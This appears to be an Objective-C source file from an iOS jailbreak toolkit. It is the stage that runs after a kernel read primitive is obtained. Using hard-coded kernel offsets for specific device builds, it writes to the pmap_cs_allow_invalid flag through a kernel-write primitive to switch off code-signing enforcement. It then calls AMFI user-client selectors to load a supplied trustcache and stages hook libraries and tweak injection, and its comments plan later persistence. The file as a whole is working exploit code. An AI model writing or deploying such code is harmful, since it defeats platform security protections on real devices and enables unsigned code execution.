#import "Lum1naAfterKread.h"
#import "Lum1naBoard.h"
#import "LabLocalTime.h"
#import "LabRuntimeOffsets.h"
#import "A14_23F77_LabOffsets.h"
#import "Lum1naSocketKRW.h"
#import "P06xLog.h"

#import <IOKit/IOKitLib.h>
#import <string.h>
#import <uuid/uuid.h>
#import <stdarg.h>

#define AK_TAG @"afterkread"
#define LUM_CDHASH_LEN 20

typedef struct {
    uint8_t hash[LUM_CDHASH_LEN];
    uint8_t hash_type;
    uint8_t flags;
} __attribute__((packed)) lum_tc_entry_v1;

typedef struct {
    uint32_t version;
    uuid_t uuid;
    uint32_t length;
    lum_tc_entry_v1 entries[];
} __attribute__((packed)) lum_tc_file_v1;

static void ak_log(NSMutableString *s, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"%@\n", line];
    P06xLog(AK_TAG, line);
}

static NSArray<NSString *> *ak_basebinNames(void) {
    // Dopamine 3.0.10 BaseBin/ + Relaxin 0.5.4 RootHide payload names.
    // Drop into Documents/basebin. Do not copy Dopamine kfd/ClearSword.
    return @[
        @"basebin.tc",
        @"basebin.tar",
        @"trustcache",
        @"jbctl",
        @"launchdhook.dylib",
        @"systemhook.dylib",
        @"watchdoghook.dylib",
        @"dyldhook.dylib",
        @"forkfix.dylib",
        @"hookd",
        @"opainject",
        @"libjailbreak.dylib",
        @"rootlesshooks",
        @"TweakLoader.dylib",
        @"libellekit.dylib",
        @"CydiaSubstrate",
        @"Relaxin.roothide",
    ];
}

static NSArray<NSString *> *ak_tweakDylibs(void) {
    NSMutableArray *out = [NSMutableArray array];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (!docs) return out;
    NSString *tweaks = [docs stringByAppendingPathComponent:@"tweaks"];
    NSArray<NSString *> *names = [[NSFileManager defaultManager]
                                  contentsOfDirectoryAtPath:tweaks error:nil];
    for (NSString *n in names) {
        if ([n.pathExtension.lowercaseString isEqualToString:@"dylib"] ||
            [n.pathExtension.lowercaseString isEqualToString:@"deb"]) {
            [out addObject:[tweaks stringByAppendingPathComponent:n]];
        }
    }
    return out;
}

static NSArray<NSString *> *ak_searchRoots(void) {
    NSMutableArray *roots = [NSMutableArray array];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (docs) {
        [roots addObject:docs];
        [roots addObject:[docs stringByAppendingPathComponent:@"basebin"]];
        [roots addObject:[docs stringByAppendingPathComponent:@"tweaks"]];
    }
    NSString *bundle = [[NSBundle mainBundle] resourcePath];
    if (bundle) {
        [roots addObject:bundle];
        [roots addObject:[bundle stringByAppendingPathComponent:@"basebin"]];
    }
    return roots;
}

static NSString *ak_findFile(NSString *name) {
    for (NSString *root in ak_searchRoots()) {
        NSString *path = [root stringByAppendingPathComponent:name];
        if ([[NSFileManager defaultManager] fileExistsAtPath:path]) return path;
    }
    return nil;
}

static NSData *ak_loadTrustcacheBlob(NSMutableString *s) {
    NSString *path = ak_findFile(@"basebin.tc");
    if (!path) {
        ak_log(s, @"[*] no basebin.tc in Documents/basebin, Documents, or bundle");
        return nil;
    }
    NSData *data = [NSData dataWithContentsOfFile:path];
    ak_log(s, @"[*] loaded %@ (%lu bytes)", path, (unsigned long)data.length);
    if (data.length < sizeof(uint32_t) * 2 + sizeof(uuid_t)) {
        ak_log(s, @"[-] basebin.tc too small for trustcache_file_v1");
        return nil;
    }
    const lum_tc_file_v1 *tc = (const lum_tc_file_v1 *)data.bytes;
    ak_log(s, @"[*] tc version=%u length=%u (Dopamine v1 layout)", tc->version, tc->length);
    return data;
}

static io_connect_t ak_openAMFI(NSMutableString *s) {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleMobileFileIntegrity"));
    if (!svc) {
        ak_log(s, @"[-] AppleMobileFileIntegrity service missing");
        return 0;
    }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    ak_log(s, @"[*] AMFI IOServiceOpen type=0 kr=0x%x conn=%u", kr, (unsigned)conn);
    if (kr != KERN_SUCCESS) return 0;
    return conn;
}

@implementation Lum1naAfterKread

+ (NSString *)plan {
    const LabOffTab *off = LabOff();
    const char *tag = (off && off->tag) ? off->tag : "?";
    NSMutableString *s = [NSMutableString string];
    [s appendString:
     @"LUM1NA CONSTELLATION (Dopamine 3.0.10 BaseBin + Relaxin/RootHide names):\n"
     @"  0 HOLD until kreadbuf of a known kernel string -> board.commitSlide.\n"
     @"  1 pmap_cs_allow_invalid *(pmap+0xca)=1 (A14 PPL; not momentarius).\n"
     @"  2 AMFI UC loadTrustCache sel 2/7 of Documents/basebin/basebin.tc.\n"
     @"  3 trustcache launchdhook/systemhook/dyldhook/watchdoghook/forkfix.\n"
     @"  4 inject via opainject + ElleKit TweakLoader (Relaxin.roothide marker).\n"
     @"  5 persist/tempRoot/boot-rejailbreak stay HOLD — novel Lum1na, later.\n"];
    if (off && off->tag && strcmp(off->tag, "A12X_23G71") == 0) {
        [s appendString:@"A12X 23G71 = no SPTM. momentarius is PPL-on-KRW, not a kernel slot.\n"];
        [s appendFormat:@"T8020 pins (unslid) tag %s:\n", tag];
        [s appendFormat:@"  AMFIUserClient_externalMethod  0x%llx\n", off->amfi_external];
        [s appendFormat:@"  loadTrustCache                 0x%llx  sel %u / %u\n",
         off->amfi_loadtc, off->amfi_sel_copy, off->amfi_sel_manifest];
        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx\n", off->pmap_cs_allow];
        [s appendString:@"  pmap_load_trust_cache          (cstring absent — not pinned)\n"];
        [s appendFormat:@"  aks_wvek                       0x%llx\n", off->aks_wvek_overflow];
        [s appendString:@"  owns_replaceable               present (twin 23G71)\n"];
    } else {
        [s appendString:@"A14 = PPL. pmap_cs_allow_invalid + AMFI UC sel 2/7 from the same process.\n"];
        [s appendFormat:@"23F77 pins (unslid) tag %s Ghidra 2026-09-29:\n", tag];
        [s appendFormat:@"  AMFIUserClient_externalMethod  0x%llx\n",
         off ? off->amfi_external : A14_23F77_AMFI_EXTERNALMETHOD];
        [s appendFormat:@"  loadTrustCache                 0x%llx  sel %u / %u\n",
         off ? off->amfi_loadtc : A14_23F77_AMFI_LOADTRUSTCACHE,
         off ? off->amfi_sel_copy : A14_23F77_AMFI_LOADTC_SEL_COPY,
         off ? off->amfi_sel_manifest : A14_23F77_AMFI_LOADTC_SEL_MANIFEST];
        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx  *(pmap+0xca)=1\n",
         off ? off->pmap_cs_allow : A14_23F77_PMAP_CS_ALLOW_INVALID];
        [s appendFormat:@"  pmap_load_trust_cache          0x%llx\n",
         off ? off->pmap_load_tc : A14_23F77_PMAP_LOAD_TRUST_CACHE];
        [s appendString:@"  owns_replaceable               ABSENT (detach bit + size only)\n"];
        [s appendString:@"  EncType_Max                    PRESENT; session-mismatch ABSENT\n"];
    }
    return s;
}

+ (NSString *)tap {
    P06xLogBegin(AK_TAG);
    NSMutableString *s = [NSMutableString string];
    Lum1naBoard *b = [Lum1naBoard shared];
    const LabOffTab *off = LabOff();

    ak_log(s, @"=== After-Kread %@ ===", LabLocalMilitaryNow() ?: @"?");
    ak_log(s, @"hasKread=%@ hasKwrite=%@ leaks=%lu sku=%@ kslide=0x%llx",
           b.hasKread ? @"YES" : @"NO",
           b.hasKwrite ? @"YES" : @"NO",
           (unsigned long)b.leaks.count,
           b.sku ?: @"?",
           (unsigned long long)b.kslide);
    [s appendString:[self plan]];
    P06xLog(AK_TAG, @"plan dumped");

    ak_log(s, @"[*] Dopamine 3.0.10 / Relaxin-RootHide names this slot consumes after hasKread:");
    for (NSString *name in ak_basebinNames()) {
        NSString *path = ak_findFile(name);
        ak_log(s, @"    %-22s %@", name.UTF8String, path ?: @"(missing)");
    }
    NSArray<NSString *> *tweaks = ak_tweakDylibs();
    if (tweaks.count == 0) {
        ak_log(s, @"[*] Documents/tweaks empty — drop dylibs here for first injection");
    } else {
        ak_log(s, @"[*] Documents/tweaks (%lu):", (unsigned long)tweaks.count);
        for (NSString *p in tweaks) {
            ak_log(s, @"    %@", p.lastPathComponent);
        }
    }

    io_connect_t conn = ak_openAMFI(s);
    if (conn) {
        ak_log(s, @"[+] AMFI user client open — reach OK");
        IOServiceClose(conn);
        conn = 0;
    }

    if (!b.hasKread) {
        ak_log(s, @"HOLD: no kreadbuf. AMFI sel 2/7 and pmap_cs poke stay compiled, unfired.");
        ak_log(s, @"Drop basebin.tc into Documents/basebin and tweak dylibs into Documents/tweaks.");
        ak_log(s, @"Re-tap after LightSword or P044 commitSlide. persist/tempRoot stay later.");
        [[Lum1naBoard shared] recordEvent:@"afterkread"
                                     kind:@"hold"
                                   detail:@"hasKread=NO"
                                   source:@"afterkread"];
        NSString *body = P06xLogDump(AK_TAG);
        return body.length ? body : s;
    }

    ak_log(s, @"FIRING: board.hasKread, running Dopamine-shaped AMFI/pmap_cs path");
    [[Lum1naBoard shared] recordEvent:@"afterkread"
                                 kind:@"fire"
                               detail:@"hasKread=YES"
                               source:@"afterkread"];

    uint32_t selCopy = off ? off->amfi_sel_copy : A14_23F77_AMFI_LOADTC_SEL_COPY;
    uint32_t selManifest = off ? off->amfi_sel_manifest : A14_23F77_AMFI_LOADTC_SEL_MANIFEST;
    uint32_t pmapOff = A14_23F77_PMAP_CS_ALLOW_OFF;

    uint64_t pmapVA = 0;
    for (NSDictionary *e in b.leaks) {
        if (![e isKindOfClass:[NSDictionary class]]) continue;
        if (![e[@"kind"] isEqualToString:@"pmap"]) continue;
        pmapVA = strtoull([[e[@"va"] description] UTF8String], NULL, 16);
        if (pmapVA) break;
    }
    if (pmapVA && b.krwContext) {
        uint64_t addr = pmapVA + pmapOff;
        ak_log(s, @"[*] pmap_cs poke *(0x%llx)=1 (pmap+0x%x)", (unsigned long long)addr, pmapOff);
        bool ok = Lum1naSocketKRW_KWrite8((Lum1naSocketKRWContext *)b.krwContext, addr, 1);
        ak_log(s, @"[%@] pmap_cs KWrite8", ok ? @"+" : @"-");
    } else {
        ak_log(s, @"[*] pmap poke waits for a leaks[] row kind=pmap (pmap kva still unknown)");
    }

    NSData *tc = ak_loadTrustcacheBlob(s);
    conn = ak_openAMFI(s);
    if (conn && tc) {
        kern_return_t kr = IOConnectCallMethod(conn, selCopy,
                                               NULL, 0,
                                               tc.bytes, tc.length,
                                               NULL, NULL, NULL, NULL);
        ak_log(s, @"[*] AMFI loadTrustCache sel %u (copy) kr=0x%x", selCopy, kr);
        kr = IOConnectCallMethod(conn, selManifest,
                                 NULL, 0,
                                 tc.bytes, tc.length,
                                 NULL, NULL, NULL, NULL);
        ak_log(s, @"[*] AMFI loadTrustCache sel %u (manifest) kr=0x%x", selManifest, kr);
        IOServiceClose(conn);
    } else if (conn) {
        ak_log(s, @"[*] AMFI open with no basebin.tc — sel 2/7 not called");
        IOServiceClose(conn);
    }

    ak_log(s, @"[*] tweak injection: trustcached launchdhook + opainject/ElleKit TweakLoader.");
    ak_log(s, @"[*] persist/tempRoot/boot-rejailbreak HOLD — first injection is this slot, novel later.");
    NSString *body = P06xLogDump(AK_TAG);
    return body.length ? body : s;
}

@end
